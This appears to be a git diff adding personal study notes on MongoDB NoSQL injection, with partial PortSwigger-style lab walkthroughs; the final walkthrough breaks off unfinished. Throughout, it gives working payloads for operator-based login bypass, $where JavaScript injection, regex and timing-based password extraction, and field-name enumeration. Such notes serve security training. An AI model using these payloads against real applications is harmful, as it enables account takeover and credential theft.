@@ -78,32 +78,167 @@ https://insecure-website.com/product/lookup?category=fizzy'%00
 
 ### NoSQL operator injection
 
+Examples of MongoDB query operators:
+- $where
+- $ne
+- $in
+- $regex
 
+**Submitting query operators**
 
+In JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`
 
+For URL-based inputs, you can insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`. If this doesn't work, you can try the following:
 
+    Convert the request method from GET to POST.
+    Change the Content-Type header to application/json.
+    Add JSON to the message body.
+    Inject query operators in the JSON.
 
+Note you can use the Content-Type converter extension to change things like:
+- JSON to XML
+- XML to JSON
+- Body parameters to JSON
+- Body parameters to XML
 
+### Detecting operator injection in MongoDB
 
+Consider a vulnerable application that accepts a username and password in the body of a `POST` request:
 
+```
+{"username":"wiener","password":"peter"}
+```
 
+Test each input with a range of operators, for example to test whether the username input processes the query operator: `{"username":{"$ne":"invalid"},"password":"peter"}`
 
+When executed this will pull all the users with usernames not equal to `invalid`
 
+If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload: `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`
 
+As a result, you're logged into the application as the first user in the collection. To target an account do something like: `{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`
 
+### Exploiting syntax injection to extract data 
 
+**Exfiltrating data in MongoDB**
+
+Consider a vulnerable application that allows users to look up other registered usernames and displays their role:
+`https://insecure-website.com/user/lookup?username=admin`
+
+This results in the following NoSQL query of the `users` collection:
+`{"$where":"this.username == 'admin'"}`
+
+As the query uses the $where operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data. For example, you could send the following payload: `admin' && this.password[0] == 'a' || 'a'=='b`
+
+This returns the first character of the users password string letting you to be able to extract the password character by character
+
+You could also use the JavScript `match()` funciton to extrac info: `admin' && this.password.match(/\d/) || 'a'=='b`
+
+**identifying field names**
+
+For example, to identify whether the MongoDB database contains a password field, you could submit the following payload:
+`https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'`
+
+Send the payload again for an existing field and for a field that doesn't exit: 
+username field exists: `admin' && this.username!='`
+foo doesn't: `admin' && this.foo!='`
+
+### Exploiting NoSQL operator injection to extract data
+
+**injecting operators in MongoDB**
+
+Consider a vulnerable application that accepts username and password in the body of a `POST` request:
+`{"username":"wiener","password":"peter"}`
+
+Try adding the $where operator as an additional parameter, then send one request where the condition evaluates to false, and another that evaluates to true:
+
+False: `{"username":"wiener","password":"peter", "$where":"0"}`
+True: `{"username":"wiener","password":"peter", "$where":"1"}`
+
+**Extracing field names**
+
+If you have injected an operator that enables you to run JavaScript you may be able to use the `keys()` method to extract the name of data fields:
+`"$where":"Object.keys(this)[0].match('^.{0}a.*')"`
+
+**Exfiltrating data using operators**
+
+Consider a vulnerable application that accepts a username and password in the body of a POST request: `{"username":"myuser","password":"mypass"}`
+
+You could start by testing whether the `$regex` operator is processed as follows:
+`{"username":"admin","password":{"$regex":"^.*"}}`
+
+If the response to this request is different to the one you receive when you submit an incorrect password, this inidcates that the application may be vulnerable. You can use the `$regex` operator to extract data character by character. Example, the following payload checks the password begins with an `a`:
+`{"username":"admin","password":{"$regex":"^a*"}}`
+
+### Timing based injection
+
+To conduct timing-based NoSQL injection:
+- load the page several times to determine a baseline loading time
+- insert a timing based payload into the input, for example: `{"$where": "sleep(5000)"}`
+- identify whether the response loads more slowly, this indicates a successful injection
+
+Example timing based payloads that will trigger a time delay if the password begins with the `a`:
+
+```
+admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
+admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
+```
 
 ## Labs walkthrough
 
+### Detecting NoSQL injection
 
+Background:
 
+```
+The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection. 
+```
 
+- access lab and click on a product category filter
+- in burp history find the filter request and send to repeater
+- in repeater, submit a `'` character in the category parameter, notice that this causes a JavaScript syntax error
+- submit a valid JavaScript payload in the category param: `Gifts'+'`, make sure you URL encode it
+- identify whether you can inject boolean conditions:
+  - submit false condition: `Gifts' && 0 && 'x`
+  - submit true condition: `Gifts' && 1 && 'x`
+- submit a boolean condition that always evaluates to true in the category param: `Gifts'||1||'`
+- right click the response and select `show response in browser`
+- copy the URL and load it
 
+### Exploiting NoSQL operator injection to bypass authentication
 
+Background: 
 
+```
+The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection using MongoDB operators.
 
+To solve the lab, log into the application as the administrator user.
 
+You can log in to your own account using the following credentials: wiener:peter. 
+```
 
+- log into the application, go to burp history and send the `POST /login` request to repeater
+- test the username and password parameters
+  - from `"wiener"` to `{"$ne":""}` then send the request
+  - change the value of the username param from `{"$ne":""}` to `{"$regex":"wien.*"}` and notice that you can also log in when using the `$regex` operator
+  - with the username param set as `{"$ne":""}` schange the value of the password param from `peter` to `{"$ne":""}` now send this and notice that this causes the query to return an unexpected number of records
+- with the password params set as `{"$ne":""}` change the value of the username param to `{"$regex":"admin.*"},` then send again, notice that this logs you in as the admin user
+- right click the response and select `show response in browser`, copy this URL and open in browser
+
+### Exploiting NoSQL injection to extract data
+
+Background: 
+
+```
+The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.
+
+To solve the lab, extract the password for the administrator user, then log in to their account.
+
+You can log in to your own account using the following credentials: wiener:peter. 
+```
+
+Tip: The password only uses lowercase letters
+
+- 
 
 
 
